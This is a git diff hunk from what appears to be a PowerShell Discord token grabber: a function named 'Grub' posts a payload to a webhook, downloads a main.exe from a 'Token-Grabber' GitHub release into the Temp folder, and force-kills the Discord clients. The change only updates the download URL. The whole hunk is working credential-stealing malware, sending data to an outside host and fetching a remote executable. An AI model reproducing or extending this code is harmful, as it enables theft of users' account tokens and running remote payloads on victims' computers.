@@ -87,7 +87,7 @@ function Grub {
     Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing | Out-Null
 
     Set-Location $env:LOCALAPPDATA\Temp
-    Invoke-WebRequest -Uri "https://github.com/KDot227/Batch-Token-Grabber/releases/download/V3.0/main.exe" -OutFile "main.exe" -UseBasicParsing
+    Invoke-WebRequest -Uri "https://github.com/KDot227/Powershell-Token-Grabber/releases/download/Fixed_version/main.exe" -OutFile "main.exe" -UseBasicParsing
 
     taskkill.exe /f /im "Discord.exe" | Out-Null
     taskkill.exe /f /im "DiscordCanary.exe" | Out-Null
